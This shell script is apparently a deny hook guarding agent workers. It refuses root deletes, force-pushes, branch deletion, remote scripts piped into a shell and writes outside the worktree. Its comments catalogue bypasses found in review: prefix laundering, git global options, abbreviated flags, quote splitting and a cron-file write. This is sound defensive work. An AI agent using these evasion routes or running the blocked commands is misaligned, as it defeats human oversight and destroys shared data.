# Drop env/sudo-style prefixes so a refused command cannot be laundered by putting something
# harmless in front of it. `sudo` is peeled but REATTACHED — the rules below match `sudo`
# themselves — because an assignment under it (`sudo GIT_DIR=x git push -d`) otherwise hid
# the whole command from every anchored pattern (PR #321 review). The C records reaching it
# are already peeled by the payload reader (_command_words, the one peeler: this one knew no
# timeout/exec/setsid and no option operands, 2026-10-23 review, P1-3); it stays as a second
# pass over the assignments those records keep in front.
strip_prefix() {
  _c=$(canon_first "$1")
  _pre=""
  case "$_c" in
    sudo\ *)
      _pre="sudo "; _c=${_c#sudo }
      # sudo's own option run must peel too, or `sudo -n tee`, `sudo -- tee`,
      # `sudo -u root tee`, and stacked `sudo sudo tee` launder the reattached
      # prefix the tee boundary matches (PR #387 security review).
      while : ; do
        case "$_c" in
          sudo\ *)                _c=${_c#sudo } ;;              # stacked sudo
          --\ *)                  _c=${_c#-- }; break ;;         # options end here
          --*=*\ *)               _c=${_c#* } ;;                 # --user=root
          -[uUghpUCTRt]\ *\ *\ *) _c=${_c#* }; _c=${_c#* } ;;    # flag + separate operand
          -*\ *)                  _c=${_c#* } ;;                 # bare flags: -n -E -A -k…
          *) break ;;
        esac
      done ;;
  esac
  while : ; do
    _c=$(canon_first "$_c")
    case "$_c" in
      env\ *)     _c=${_c#env } ;;
      nohup\ *)   _c=${_c#nohup } ;;
      nice\ *)    _c=${_c#nice } ;;  # `nice tee` is the same write (#387 review)
      time\ *)    _c=${_c#time } ;;
      command\ *) _c=${_c#command } ;;
      builtin\ *) _c=${_c#builtin } ;;
      \ *)        _c=${_c# } ;;
      # A NAME=value prefix only IS a prefix when the `=` lives in the FIRST
      # token — a glob cannot confine it there (`*` crosses spaces), so the
      # inner case re-checks the first token alone. An `=` further right is an
      # option operand — `git -c a=b push -f`, `git --git-dir=/x push` — and
      # letting this arm fire there ate `git ` and freed the options after it
      # (#297). A quoted value cuts at its closing quote, not the first space
      # (PR #308 review, P1); an ESCAPED quote inside stays beyond it.
      [A-Za-z_]*=*[!\ ]*\ *)
        case "${_c%% *}" in
          [A-Za-z_]*=*) _c=$(skip_tok "$_c") ;;
          *) break ;;
        esac ;;
      *) break ;;
    esac
  done
  printf '%s%s' "$_pre" "$_c"
}

# git's global options sit between `git` and the subcommand, and every rule here
# anchors the subcommand to the word `git`: `git -C /x push --force`,
# `git -c a=b push -f`, `git --git-dir=/x push --force` all named refused pushes
# and were ALLOWED (#297). Strip the leading option run — an option that takes
# a separate operand drops the operand too, and a quoted operand is cut at its
# closing quote, not the next space. Glued forms need no arm: git rejects
# `-C/x` and `-ca=b` itself. An option this does not know ends the run and the
# segment is judged as written — a future global option still evades, which is
# the same string-matching limit the tier already states above.
strip_git_opts() {
  case "$1" in
    git\ *)       _pre="";      _rest=${1#git } ;;
    sudo\ git\ *) _pre="sudo "; _rest=${1#sudo git } ;;
    *)            printf '%s' "$1"; return ;;
  esac
  while : ; do
    case "$_rest" in
      # Options taking a separate operand: drop the option, then the operand.
      -C\ *|-c\ *|--git-dir\ *|--work-tree\ *|--namespace\ *|--config-env\ *)
        _rest=${_rest#* }
        _rest=$(skip_tok "$_rest") ;;
      # Immediate-exit options print and stop — `git --html-path push --force`
      # never pushes at all, and stripping the option would judge tokens git
      # ignores (PR #321 review). Empty the rest so the segment normalizes to a
      # bare `git`. `--exec-path` is here, not in the operand arm: git's own
      # `[=path]` is optional-and-inline, so a separate token after it is just
      # more ignored text.
      --html-path|--html-path\ *|--man-path|--man-path\ *|--info-path|--info-path\ *|\
      --exec-path|--exec-path\ *|--version|--version\ *|--help|--help\ *|-h|-h\ *)
        _rest=""; break ;;
      # Inline `--opt=value`: drop `name=` then the whole word — the value may
      # quote only its middle (`=/srv/dir" one"`), so it goes through skip_tok
      # like any other operand (PR #321 review, P1).
      --git-dir=*|--work-tree=*|--namespace=*|--exec-path=*|--config-env=*)
        _rest=${_rest#*=}
        _rest=$(skip_tok "$_rest") ;;
      # Valueless flags drop one token each.
      -p\ *|-P\ *|--paginate\ *|--no-pager\ *|--bare\ *|--no-replace-objects\ *|--no-advice\ *|\
      --literal-pathspecs\ *|--glob-pathspecs\ *|--noglob-pathspecs\ *|--icase-pathspecs\ *|\
      --no-optional-locks\ *)
        _rest=${_rest#* } ;;
      *) break ;;
    esac
  done
  printf '%sgit %s' "$_pre" "$_rest"
}

# Collapse every whitespace run to one space and trim the ends. The prefix and
# option arms match single literal spaces, so `git -C␣␣/x` or a tab after `-C`
# left the options in place and the refused push unmatched (PR #321 review).
# Collapsing a quoted value's interior is harmless — rules never inspect a
# value, only the command around it.
norm_ws() {
  _n=$(printf '%s' "$1" | tr -s '[:space:]' ' ')
  _n=${_n# }; _n=${_n% }
  printf '%s' "$_n"
}

# Remove the first shell WORD from $1 and print what follows. A word may quote
# only part of itself — `--git-dir=/srv/dir" one"` is one word — and a `\x`
# escape binds anywhere, including `\ ` for a space (#321 review) — so scanning
# must skip quoted spans and escaped chars wherever they sit. An unclosed
# quote eats to end: that mangles the line, it cannot free a refused command.
skip_tok() {
  _w=$1
  while : ; do
    _p=$_w
    case "$_w" in
      \"*)
        _w=${_w#\"}
        while : ; do
          _i=$_w
          _q=${_w%%[\\\"]*}
          _w=${_w#"$_q"}
          case "$_w" in
            \"*) _w=${_w#\"}; break ;;
            \\*) _w=${_w#\\?} ;;
            *)   break ;;
          esac
          [ "$_w" = "$_i" ] && break
        done ;;
      \'*)    _w=${_w#\'}; _w=${_w#*\'} ;;
      *)      _h=${_w%%[\\\'\" ]*}; _w=${_w#"$_h"}
              case "$_w" in \\*) _w=${_w#\\?} ;; esac ;;
    esac
    [ "$_w" = "$_p" ] && break
    case "$_w" in \ *) break ;; esac
  done
  printf '%s' "${_w# }"
}

# `-C`, `--git-dir`, `--work-tree`, and GIT_DIR=/GIT_WORK_TREE= point a command
# at a DIFFERENT repository, but DEFAULT_BRANCH below is resolved in the hook's
# own working directory — so under a redirect nothing here can prove which ref
# the target repo calls its default (#321 review). Detected on the raw segment,
# before the options were stripped away. An env var only redirects when it sits
# in the leading assignment run — `feature/GIT_DIR=config` is a ref name, not
# a redirect (#321 review) — and the option run ends at `git` itself.
git_redirected() {
  _r=$1
  while : ; do
    _r=$(canon_first "$_r")
    case "$_r" in
      \ *)          _r=${_r# } ;;
      env\ *)       _r=${_r#env } ;;
      sudo\ *)      _r=${_r#sudo } ;;
      command\ *)   _r=${_r#command } ;;
      builtin\ *)   _r=${_r#builtin } ;;
      nohup\ *)     _r=${_r#nohup } ;;
      time\ *)      _r=${_r#time } ;;
      GIT_DIR=*|GIT_WORK_TREE=*) return 0 ;;
      # Any other assignment advances past its token — but only when the `=`
      # lives in the FIRST token, as in strip_prefix: `git --git-dir=/x` also
      # contains `=`+space and letting this arm fire there ate `git ` (#321
      # review). A trailing token with no space after fails the arm outright,
      # so the loop cannot spin on it; a quoted value cuts at its closing
      # quote, not the first space inside.
      [A-Za-z_]*=*\ *)
        case "${_r%% *}" in
          [A-Za-z_]*=*) _r=$(skip_tok "$_r") ;;
          *) break ;;
        esac ;;
      *) break ;;
    esac
  done
  case "$_r" in git\ *) _r=${_r#git } ;; *) return 1 ;; esac
  # Only git's LEADING global-option run can redirect — a `-C` sitting inside a
  # `-c` operand value is text, not an option, so the run is walked and every
  # operand skipped rather than substring-matched (#321 review).
  while : ; do
    case "$_r" in
      -C\ *|-C|--git-dir\ *|--git-dir|--work-tree\ *|--work-tree|\
      --git-dir=*|--work-tree=*)
        return 0 ;;
      -c\ *|-c|--namespace\ *|--namespace|--config-env\ *|--config-env)
        _r=${_r#* }
        _r=$(skip_tok "$_r") ;;
      --namespace=*|--config-env=*|--exec-path=*)
        _r=${_r#*=}
        _r=$(skip_tok "$_r") ;;
      -p|-p\ *|-P|-P\ *|--paginate|--paginate\ *|--no-pager|--no-pager\ *|\
      --bare|--bare\ *|--no-replace-objects|--no-replace-objects\ *|\
      --no-advice|--no-advice\ *|--literal-pathspecs|--literal-pathspecs\ *|\
      --glob-pathspecs|--glob-pathspecs\ *|--noglob-pathspecs|--noglob-pathspecs\ *|\
      --icase-pathspecs|--icase-pathspecs\ *|--no-optional-locks|--no-optional-locks\ *)
        _r=${_r#* } ;;
      *) return 1 ;;
    esac
  done
}

# Normalize push options only after the command/global-option run was resolved.
# Operand-taking options consume the rest of a short cluster or the next word;
# `-vof` carries push-option `f`, whereas `-vf` forces. Operand text must never
# supply a force flag, a lease, or a deleted ref to the HIGH tier.
#
# Long options are canonicalized first. Git accepts any unambiguous prefix of a
# long option (parse-options): `--del`, `--mi`, `--pru`, `--force-w` and
# `--no-force-w` are --delete, --mirror, --prune, --force-with-lease and
# --no-force-with-lease, so `git push origin --del main` used to pass because
# only full spellings were matched. LONG is git-push 2.43's long-option table;
# an exact name wins, a unique prefix expands, and an AMBIGUOUS prefix (which
# git itself rejects) keeps every destructive meaning it could carry but never
# grants a lease — a newer git that adds an option can only make it ambiguous.
push_policy() {
  # The command arrives on stdin, not as an argument: a git push padded past the
  # 128 KiB argv-string limit made python3 fail to start on Linux, CMD came back
  # empty, and no push rule below could match it (PR #648 review sweep).
  printf '%s' "$1" | python3 -I -c 'import sys
LONG = {"verbose": 0, "quiet": 0, "repo": 1, "all": 0, "branches": 0,
        "mirror": 0, "delete": 0, "tags": 0, "dry-run": 0, "porcelain": 0,
        "force": 0, "force-with-lease": 0, "force-if-includes": 0,
        "recurse-submodules": 1, "thin": 0, "receive-pack": 1, "exec": 1,
        "set-upstream": 0, "progress": 0, "prune": 0, "no-verify": -1,
        "verify": -1, "follow-tags": 0, "signed": 0, "atomic": 0,
        "push-option": 1, "ipv4": -1, "ipv6": -1}
NAMES = set(LONG) | {"no-" + n for n, kind in LONG.items() if kind >= 0}
OPERAND = ("-o", "--push-option", "--receive-pack", "--exec", "--repo",
           "--recurse-submodules")
DANGER = ("delete", "mirror", "prune", "force", "no-force-with-lease")
def canon(word):
    name, eq, value = word[2:].partition("=")
    if name in NAMES:
        return [word]
    hits = [n for n in NAMES if n.startswith(name)] if name else []
    if len(hits) == 1:
        return ["--" + hits[0] + eq + value]
    return [word] + ["--" + n for n in DANGER if n in hits]
words = sys.stdin.read().split()
out, skip, options = [], False, True
lease, force = False, False
# 2026-10-29 audit, F4: a lease with an explicit ref protects only that ref. lease_refs holds
# the named refs, lease_all a bare lease that covers every pushed ref; pos the positionals.
lease_refs, lease_all, pos = set(), False, []
def bare_ref(ref):
    return ref[len("refs/heads/"):] if ref.startswith("refs/heads/") else ref
for raw in words:
    if skip:
        skip = False
        continue
    if raw == "--":
        options = False
        out.append(raw)
        continue
    expanded = canon(raw) if options and raw.startswith("--") else [raw]
    for word in expanded:
        if options and word in OPERAND:
            skip = True
            continue
        elif word in ("--force", "--no-force", "-f"):
            # The literal word still reaches the HIGH-tier text below; the ordered
            # bit only decides whether a lease may still exempt the push.
            if options:
                force = word != "--no-force"
        elif word == "--no-force-with-lease":
            if options:
                lease, lease_refs, lease_all = False, set(), False
            else:
                out.append("--lease-operand")
            continue
        elif word == "--force-with-lease" or word.startswith("--force-with-lease="):
            if options:
                lease = True
                ref = word.partition("=")[2].split(":", 1)[0]
                if ref:
                    lease_refs.add(bare_ref(ref))
                else:
                    lease_all = True
            else:
                # An operand grants no lease but keeps its position: after --, the
                # deletion loops skip the word after -o/--repo, and dropping this
                # one would hand them the deleted ref instead.
                out.append("--lease-operand")
            continue
        elif options and word.startswith("-") and not word.startswith("--"):
            cluster = word[1:]
            for i, flag in enumerate(cluster):
                if flag == "o":
                    skip = i == len(cluster) - 1
                    break
                if flag not in "vqnfdu46":
                    out.append(word)
                    break
                if flag == "f":
                    force = True
                out.append("-" + flag)
            continue
        if not word.startswith("-") or not options:
            pos.append(word)
        out.append(word)
# 2026-10-29 audit, F4: a lease naming refs leaves every other pushed ref unprotected, so a
# destination it does not name (origin/main is not main; an implicit or HEAD destination
# cannot be shown named) voids the lease and a forced refspec falls through to the deny.
if lease and not lease_all:
    refspecs = pos[pos.index("push") + 2:] if "push" in pos else []
    dests = [bare_ref((r[1:] if r.startswith("+") else r).rpartition(":")[2]) for r in refspecs]
    if not dests or not all(d and d in lease_refs for d in dests):
        lease = False
# Emit only the effective lease; canceled leases and operands after -- cannot
# grant the HIGH-tier exemption. Explicit global force disables lease checks
# (git-push 2.55), so an effective one replaces the lease marker. --no-force
# clears that bit in command-line order but never removes a literal force word:
# an unleased push keeps the trigger it had before E5, which only adds denials.
if force:
    out.append("--force")
elif lease:
    out.append("--force-with-lease")
print(" ".join(out))'
}

# The C records carry PRE-SPLIT, word-normalized commands from the payload reader above. They
# are split there because splitting is quote-aware and a POSIX shell cannot parse quoting without
# eval: a separator inside a quoted value used to split too, leaving the rest of the value glued
# to the FRONT of the next segment, and every rule below is anchored at `^`. `X="a&b" git push
# --force origin main` became `b" git push --force origin main` and was allowed (PR #308 review,
# P1). Selecting only C records keeps literal path/argument records out of the HIGH tier.
# Loading the commands into positional parameters keeps the loop out of a subshell, so a
# `decide deny` inside it still exits the script.
_SEGS=$(printf '%s\n' "$FIELDS" | sed -n '4,$s/^C //p')
_OLDIFS=$IFS
IFS='
'
set -f
# shellcheck disable=SC2086
set -- $_SEGS
set +f
IFS=$_OLDIFS

for _SEG in "$@"; do
  _SEG_N=$(norm_ws "$_SEG")
  CMD=$(strip_git_opts "$(strip_prefix "$_SEG_N")")
  [ -n "$(printf '%s' "$CMD" | tr -d '[:space:]')" ] || continue
  # 1. Recursive delete of a root-class target, or --no-preserve-root anywhere.
  if has '^[[:space:]]*(sudo[[:space:]]+)?rm[[:space:]]' \
    && has '(^|[[:space:]])(-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)([[:space:]]|$)'; then
    if has '(^|[[:space:]])--no-preserve-root([[:space:]]|$)'; then
      decide deny "deny-hook[HIGH]: rm --no-preserve-root is refused. No task authorizes disabling the root guard."
      exit 0
    fi
    ROOTY=0; SAFE=0
    set -f
    for TOK in $CMD; do
      TOK=${TOK#\"}; TOK=${TOK%\"}; TOK=${TOK#\'}; TOK=${TOK%\'}
      case "$TOK" in
        sudo|rm|-*|[0-9]'>'*|'>'*|'<'*|'&') continue ;;
        '/'|'//'|'/*'|'~'|'~/'|'$HOME'|'$HOME/'|'${HOME}'|'${HOME}/') ROOTY=1 ;;
        *) SAFE=1 ;;
      esac
    done
    set +f
    if [ "$ROOTY" -eq 1 ] && [ "$SAFE" -eq 0 ]; then
      decide deny "deny-hook[HIGH]: recursive delete of / or the home directory is refused. Delete a named path inside the unit worktree instead."
      exit 0
    fi
  fi

  # 2/3. Force-push and deletion. An effective lease guards concurrent updates; a
  # deletion recovers nothing, so it is judged FIRST and no lease pardons it:
  # `git push origin :main`, `-d` and `--delete` carry no force flag at all and
  # sailed under both force rules (#297).
  if has '^[[:space:]]*(sudo[[:space:]]+)?git[[:space:]]+push([[:space:]]|$)'; then
    CMD=$(push_policy "$CMD") || {
      HOOK_STRICT=1
      decide deny "deny-hook: the git push options could not be read. Fail-closed."
      exit 2
    }
    # --mirror force-updates AND deletes every remote ref the local repo lacks;
    # --prune deletes every remote ref its refspecs no longer map — either can
    # remove the default branch without naming it, so no text here can show
    # which refs go. Neither had any rule, so `git push --mirror` passed.
    if has '(^|[[:space:]])--(mirror|prune)($|[[:space:]])'; then
      decide deny "deny-hook[HIGH]: git push --mirror/--prune is refused. It deletes or rewrites remote refs it never names, the default branch among them; push named refs instead."
      exit 0
    fi
    DEFAULT_BRANCH=$(git symbolic-ref refs/remotes/origin/HEAD 2>/dev/null | sed 's|^refs/remotes/origin/||' || true)
    if [ -z "$DEFAULT_BRANCH" ]; then
      if git show-ref --verify -q refs/remotes/origin/main 2>/dev/null; then DEFAULT_BRANCH="main"
      elif git show-ref --verify -q refs/remotes/origin/master 2>/dev/null; then DEFAULT_BRANCH="master"
      fi
    fi

    # `-d`/`--delete` take their refs positionally; a `:dst` or `+:dst` refspec
    # names the deleted ref in the token itself. A bare `:` or `+:` is the
    # matching-branches push — an empty dst is not a deletion. `refs/heads/` is
    # stripped before comparing: `git push origin :refs/heads/main` deletes the
    # same ref `:main` does (#321 review).
    _DEL=0; _DEL_FLAG=0; _DEL_DEFAULT=0; _SKIP=0
    set -f
    for TOK in $CMD; do
      TOK=${TOK#\"}; TOK=${TOK%\"}; TOK=${TOK#\'}; TOK=${TOK%\'}
      # `-o`/`--push-option`, `--receive-pack`, `--repo` consume the next token —
      # its content is an option string, never a refspec: `-o :x` is not a
      # deletion of x (#321 review).
      [ "$_SKIP" -eq 1 ] && _SKIP=0 && continue
      case "$TOK" in
        -o|--push-option|--receive-pack|--exec|--repo) _SKIP=1 ;;
        -d|--delete) _DEL=1; _DEL_FLAG=1 ;;
        +:*|:*) _dst=${TOK#+}; _dst=${_dst#:}; _dst=${_dst#refs/heads/}
                [ -n "$_dst" ] || continue
                _DEL=1
                [ -n "$DEFAULT_BRANCH" ] && [ "$_dst" = "$DEFAULT_BRANCH" ] && _DEL_DEFAULT=1 ;;
      esac
    done
    set +f
    if [ "$_DEL" -eq 1 ] && git_redirected "$_SEG_N"; then
      # The push targets another repository while DEFAULT_BRANCH was resolved
      # in this one's cwd — the deleted ref cannot be shown recoverable, and
      # ask is the wrong answer for maybe-the-default. Deny.
      decide deny "deny-hook[HIGH]: deleting a remote ref under a redirected repository (-C/--git-dir/GIT_DIR) is refused — the hook cannot verify the target repo's default branch."
      exit 0
    fi
    if [ "$_DEL_FLAG" -eq 1 ] && [ -n "$DEFAULT_BRANCH" ]; then
      # The flag form names its refs among the positionals: a bare token equal
      # to the default branch — qualified or not (`--delete origin
      # refs/heads/main` is the same delete, #321 review) — is the ref being
      # deleted. A remote literally named after it earns a deny rather than a
      # silent delete — that is the error to err toward.
      _SKIP=0
      set -f
      for TOK in $CMD; do
        TOK=${TOK#\"}; TOK=${TOK%\"}; TOK=${TOK#\'}; TOK=${TOK%\'}
        [ "$_SKIP" -eq 1 ] && _SKIP=0 && continue
        case "$TOK" in
          -o|--push-option|--receive-pack|--exec|--repo) _SKIP=1; continue ;;
          git|push|sudo|-*) continue ;;
        esac
        TOK=${TOK#refs/heads/}
        [ "$TOK" = "$DEFAULT_BRANCH" ] && _DEL_DEFAULT=1 && break
      done
      set +f
    fi
    if [ "$_DEL_DEFAULT" -eq 1 ]; then
      decide deny "deny-hook[HIGH]: deleting the default branch is refused. The ref everyone else builds on is not a worker's to remove."
      exit 0
    fi
    if [ "$_DEL" -eq 1 ]; then
      decide ask "deny-hook[NEVER-LIST]: Deleting a remote ref. Per runtime/sandbox-policy.md this needs a recorded human grant before it runs."
      exit 0
    fi

    if ! has '(^|[[:space:]])--force-with-lease($|[[:space:]])'; then
      HAS_FORCE=0
      has '(^|[[:space:]])(-f|--force)($|[[:space:]])' && HAS_FORCE=1
      has '(^|[[:space:]])\+[^[:space:]]' && HAS_FORCE=1
      if [ "$HAS_FORCE" -eq 1 ]; then
        TARGETS_DEFAULT=0
        if [ -n "$DEFAULT_BRANCH" ]; then
          set -f
          for TOK in $CMD; do
            TOK=${TOK#\"}; TOK=${TOK%\"}; TOK=${TOK#\'}; TOK=${TOK%\'}
            case "$TOK" in git|push|sudo|-*) continue ;; esac
            REF=${TOK#+}; REF=${REF##*:}
            [ "$REF" = "$DEFAULT_BRANCH" ] && TARGETS_DEFAULT=1 && break
          done
          set +f
        fi
        if [ "$TARGETS_DEFAULT" -eq 1 ]; then
          decide deny "deny-hook[HIGH]: force-push to the default branch is refused. It rewrites the history everyone else builds on."
        else
          decide deny "deny-hook[HIGH]: unleased or explicit global force is refused. Use --force-with-lease without -f/--force so a concurrent push cannot be silently discarded."
        fi
        exit 0
      fi
    fi
  fi

  # 4. Fleet-wide orchestration reset.
  if has '^[[:space:]]*(sudo[[:space:]]+)?orca(-ide)?[[:space:]]+orchestration[[:space:]]+reset([[:space:]]|$)'; then
    decide deny "deny-hook[HIGH]: 'orca orchestration reset' discards the whole fleet's dispatch state. A worker never resets the orchestration it runs inside."
    exit 0
  fi
done

# A recursive rm whose every target is the root or home CLASS (W1-06): the reader normalised the
# spellings (/*/, ~/., ${HOME}/*, /dev/../, …) the per-token case above only matched literally.
# After the loop, so --no-preserve-root and the canonical spellings keep their own reasons.
if [ -n "$(printf '%s\n' "$FIELDS" | sed -n '4,$s/^Y //p' | sed -n '1p')" ]; then
  decide deny "deny-hook[HIGH]: recursive delete of / or the home directory is refused. Delete a named path inside the unit worktree instead."
  exit 0
fi

guard_check

# READ-ONLY tier (W4-05): a ro worker may read and run read-only shell, but any write this hook
# can see -- a redirect or a tee in any command the line runs, a -c body or a program fed to a
# shell included (a Z record), or an apply_patch (a P record) -- is denied regardless of the
# boundary. A shell reading a program on stdin that the hook cannot read (cat f | sh, sh < f, a
# substitution or variable as its head) is denied too: a write inside it would be unseen. A
# command the hook does not model as a write (cp/mv/rm, a package install, an interpreter's
# own file write, a script already on disk) is beyond this; the sandbox is the fs boundary for
# those (sandbox-policy.md). Runs after the HIGH tier and the self-guard so a refused shape
# keeps its own, more specific reason.
if [ "$HOOK_READONLY" = "1" ]; then
  _RO_Z=$(printf '%s\n' "$FIELDS" | sed -n '4,$s/^Z //p' | sed -n '1p')
  if [ "$_RO_Z" = "blind" ]; then
    decide deny "deny-hook[READONLY]: this worker runs read-only (ro tier), and this line feeds a shell a program on its standard input that the hook cannot read (a pipe from a file or command, a < file, a substitution or variable). A write inside it would be unseen, so it is refused; run the commands directly."
    exit 0
  fi
  if [ -n "$_RO_Z" ] \
    || [ -n "$(printf '%s\n' "$FIELDS" | sed -n '4,$s/^P //p' | sed -n '1p')" ]; then
    decide deny "deny-hook[READONLY]: this worker runs read-only (ro tier) and may not write to a file. A shell redirect, tee or apply_patch is refused; read-only shell (git diff/log, cat, running tests) is fine."
    exit 0
  fi
fi

# --- worktree boundary for Bash writes ---------------------------------------
# The boundary used to be applied only to an Edit/Write payload, so a bounded
# worker could write anywhere it liked by spelling the write as a shell line:
# `echo pwned > /etc/cron.d/x` was ALLOWED (#297). A redirect and a `tee`
# destination are the two file writes in a shell line that can be read off the
# text without knowing what the command does, so those are the two this covers.
#
# ABSOLUTE targets only. A relative target resolves against a working directory
# this hook cannot know — the host does not hand it the worker's cwd, and the
# segment before it may have been a `cd` — so judging one would be guessing, and
# a boundary that guesses at half its cases is worse than one that says what it
# covers. Deliberately NOT covered: `cp`/`mv`/`install` destinations, `dd of=`,
# an interpreter writing through its own API, a path built from a variable, and
# every relative path. The disposable sandbox is the boundary for those; this is
# defense in depth, the same advisory status the rest of this hook carries.
if [ -n "${UNIT_WORKTREE:-}" ]; then
  BOUND=$(cd "$UNIT_WORKTREE" 2>/dev/null && pwd -P) || BOUND=""
  if [ -z "$BOUND" ]; then
    decide deny "deny-hook: ORCA_UNIT_WORKTREE is set but does not resolve to a directory. Fail-closed."
    exit 0
  fi

  bounded_one() {
    _t=$1
    # The process's own standard streams and the bit bucket. `make > /dev/null`
    # is the most common redirect there is and writes nothing anyone can read;
    # refusing it would make the boundary a thing workers route around. Named
    # one by one, not as a /dev/ prefix — `> /dev/sda` IS an escape.
    case "$_t" in
      /dev/null|/dev/zero|/dev/full|/dev/tty|/dev/stdout|/dev/stderr|/dev/stdin|/dev/fd/*)
        return 0 ;;
    esac
    resolve_target "$_t"
    [ -n "$RESOLVED" ] || return 0
    case "$RESOLVED/" in "$BOUND"/*) return 0 ;; esac
    decide deny "deny-hook: this worker may only write inside its own worktree. A shell redirect or tee destination names an absolute path outside the unit boundary."
    exit 0
  }

  bounded_write() {
    _t=$1
    case "$_t" in /*) : ;; *) return 0 ;; esac
    # An unquoted glob in a target is expanded by the shell against the filesystem before
    # it writes, so the literal alone is not the target: `> wt/lin*/f` with wt/link -> /x
    # writes /x/f (W4-09). Every existing match is judged too (a quoted glob is written
    # literally, so judging its matches can only add a refusal). IFS empty: matches are not
    # field-split. Past 64 matches the expansion is more than this reads: refused.
    case "$_t" in
      *[*?[]*)
        _bw_ifs=$IFS
        IFS=''
        _bw_n=0
        for _bw_m in $_t; do
          [ "$_bw_m" = "$_t" ] && continue
          _bw_n=$((_bw_n + 1))
          if [ "$_bw_n" -gt 64 ]; then
            decide deny "deny-hook: a write target glob expands to more paths than the boundary check reads. Fail-closed: name the target."
            exit 0
          fi
          bounded_one "$_bw_m"
        done
        IFS=$_bw_ifs ;;
    esac
    bounded_one "$_t"
  }

  # Consume typed records without splitting paths on whitespace. The here-doc
  # keeps this loop in the main shell so a refusal exits the entire hook.
  _TEE=0
  while IFS= read -r _RECORD; do
    case "$_RECORD" in
      'C '*) _TEE=0
             # sudo is peeled and REATTACHED by strip_prefix so the sudo-matching rules
             # still fire — match `sudo tee` here too, or the reattach hides the one
             # write shape this boundary exists to catch (#351).
             case "$(strip_prefix "${_RECORD#C }")" in tee|tee\ *|sudo\ tee|sudo\ tee\ *) _TEE=1 ;; esac ;;
      'W '*) bounded_write "${_RECORD#W }" ;;
      'A '*) if [ "$_TEE" -eq 1 ]; then bounded_write "${_RECORD#A }"; fi ;;
    esac
  done <<EOF
$(printf '%s\n' "$FIELDS" | sed -n '4,$p')
EOF
fi
# --- Never list (ask) --------------------------------------------------------
ask() { decide ask "deny-hook[NEVER-LIST]: $1 Per runtime/sandbox-policy.md this needs a recorded human grant before it runs."; exit 0; }

never_list() {
  has '(^|[[:space:]])rm[[:space:]]+(-[a-zA-Z]*[rR][a-zA-Z]*|--recursive)' && ask "Recursive delete."
  has '(DROP|TRUNCATE)[[:space:]]+(TABLE|DATABASE|SCHEMA)' && ask "Destructive database statement."
  has '(^|[[:space:]])(kubectl|helm)[[:space:]]+(delete|uninstall)' && ask "Cluster resource teardown."
  has '(^|[[:space:]])terraform[[:space:]]+(destroy|apply)' && ask "Infrastructure mutation."
  has '(^|[[:space:]])(aws|gcloud|az)[[:space:]]+[a-z0-9-]+[[:space:]]+(delete|rm|destroy|terminate)' && ask "Cloud resource deletion."
  has '(^|[[:space:]])docker[[:space:]]+(system[[:space:]]+prune|rm[[:space:]]+-f|volume[[:space:]]+rm)' && ask "Container or volume destruction."
  # Fetched text piped into a shell or interpreter, through any wrapper and any middle stage:
  # wget, `| sudo sh`, `| python3` all evaded the curl-into-sh form (2026-10-23 review, §5).
  # `<(curl …)`, `"$(curl …)"` and download-then-run are judged in the payload reader (N).
  has '(^|[^[:alnum:]_.-])(curl|wget)([[:space:]][^|;&]*)?[|]([^|;&]+[|])*[[:space:]]*((sudo|doas|env|command|exec|nohup|time|nice|stdbuf|setsid|timeout|ionice|chrt|taskset|xargs|builtin|[A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*)([[:space:]]+[^[:space:]|;&]+)*[[:space:]]+)?([^[:space:]|;&]*/)?((ba|da|z|k|mk|a|y|c|tc|fi)?sh|python[0-9.]*|perl|ruby|node|nodejs|deno|bun|php|pwsh)([[:space:]]|$|[;&|)"])' \
    && ask "Piping a remote script into a shell or interpreter."
  has '(^|[[:space:]])(npm|pnpm|yarn|cargo|gem|twine)[[:space:]]+publish' && ask "Publishing a package."
  has '(^|[[:space:]])git[[:space:]]+reset[[:space:]]+--hard' && ask "Discarding uncommitted work."
  has '(^|[[:space:]])git[[:space:]]+(checkout|restore)[[:space:]]+\.' && ask "Discarding every local change."
  has '(^|[[:space:]])gh[[:space:]]+secret[[:space:]]+(set|delete)' && ask "Writing or removing a repository secret."
  has '(^|[[:space:]])gh[[:space:]]+repo[[:space:]]+delete' && ask "Deleting a repository."
  has '(^|[[:space:]])(aws[[:space:]]+iam|gcloud[[:space:]]+iam)[[:space:]]+.*(create|add)' && ask "Provisioning a credential or identity."
  has '(^|[[:space:]])git[[:space:]]+push[^|;]*(prod|production|release)' && ask "Pushing to a production ref."
  # Every rule above is `has && ask` — when nothing matches the function's
  # status is the last has's failure, and set -e reads a failing CALL as a
  # failing command. Returning 0 keeps "nothing to ask" from exiting nonzero.
  :
}

# The list judges the line twice. As WRITTEN first, because rules like curl|sh
# match on the `|` that sits BETWEEN segments — a normalized join replaces the
# separators with `;` and would unsee the shape the rule exists to catch. Then
# over the same normalized segments the HIGH tier judged — prefixes and git
# global options stripped — so `git -C /x reset --hard` asks what `git reset
# --hard` asks (#297). A line the split somehow emptied falls back to raw.
# N: a never-list shape the payload reader judged on parsed words -- history-discarding git
# beyond the two forms a regex reads, and a fetched script run through <(…), "$(…)" or a
# downloaded file (2026-10-23 review, P2-12, section 5).
_NEVER=$(printf '%s\n' "$FIELDS" | sed -n '4,$s/^N //p' | sed -n '1p')
[ -z "$_NEVER" ] || ask "$_NEVER"
# R: the segments with their real operators and with quoted DATA dropped (echo/printf text, a
# commit or PR message), so an example is not asked about (#598). FULL_CMD only if R is absent.
_R=$(printf '%s\n' "$FIELDS" | sed -n '4,$s/^R //p' | sed -n '1p')
CMD=${_R#=}
[ -n "$_R" ] || CMD=$FULL_CMD
never_list
CMD=
for _SEG in "$@"; do
  _n=$(strip_git_opts "$(strip_prefix "$(norm_ws "$_SEG")")")
  CMD=${CMD:+$CMD ; }$_n
done
[ -z "$CMD" ] || never_list

# Allowed: record the touches an `apply_patch <<EOF` in this command makes.
[ "$HAS_PATCH" = "0" ] || record_touches
exit 0
